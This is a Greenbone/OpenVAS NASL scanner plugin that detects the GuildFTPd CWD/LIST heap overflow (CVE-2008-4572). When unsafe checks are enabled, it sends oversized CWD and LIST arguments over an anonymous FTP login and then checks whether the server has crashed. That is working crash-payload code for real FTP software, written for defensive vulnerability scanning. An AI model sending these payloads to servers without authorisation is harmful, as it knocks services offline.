if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.800114" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2008-10-21 16:25:40 +0200 (Tue, 21 Oct 2008)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_cve_id( "CVE-2008-4572" );
	script_bugtraq_id( 31729 );
	script_name( "GuildFTPd CWD and LIST Command Heap Overflow Vulnerability" );
	script_xref( name: "URL", value: "http://milw0rm.com/exploits/6738" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/32218/" );
	script_xref( name: "URL", value: "http://www.frsirt.com/english/advisories/2008/2794" );
	script_category( ACT_MIXED_ATTACK );
	script_tag( name: "qod_type", value: "remote_banner" );
	script_copyright( "Copyright (C) 2008 Greenbone Networks GmbH" );
	script_family( "Denial of Service" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/guildftpd/detected" );
	script_tag( name: "impact", value: "Successful exploitation allows attackers to execute arbitrary code through
  specially crafted CWD and LIST command, which can also crash the affected application." );
	script_tag( name: "affected", value: "GuildFTPd Version 0.999.14 and prior on Windows (Any)." );
	script_tag( name: "insight", value: "The flaw exists due to boundary error while processing malformed arguments
  passed to a CWD and LIST commands." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running GuildFTPd FTP Server which is prone to Heap
  Overflow Vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
require("version_func.inc.sc");
port = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: port );
if(!banner || !ContainsString( banner, "GuildFTPd" )){
	exit( 0 );
}
if(safe_checks()){
	guildVer = eregmatch( pattern: "Version ([0-9.]+)", string: banner );
	if(guildVer){
		if(version_is_less_equal( version: guildVer[1], test_version: "0.999.14" )){
			security_message( port );
		}
	}
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
banner = recv( socket: soc, length: 1024 );
if(!ContainsString( banner, "GuildFTPd" )){
	close( soc );
	exit( 0 );
}
if(ftp_authenticate( socket: soc, user: "anonymous", pass: "anonymous" )){
	send( socket: soc, data: NASLString( "cwd ", crap( data: "/.", length: 200 ), "\\n" ) );
	recv( socket: soc, length: 1024 );
	send( socket: soc, data: NASLString( "list ", crap( data: "X", length: 100 ), "\\r\\n" ) );
	recv( socket: soc, length: 1024 );
	sleep( 10 );
	close( soc );
	soc = open_sock_tcp( port );
	if(!recv( socket: soc, length: 1024 )){
		security_message( data: NASLString( "GuildFTPd Server service has been crashed on the" + "system.\\nRestart the service to resume normal operations." ), port: port );
	}
	close( soc );
}

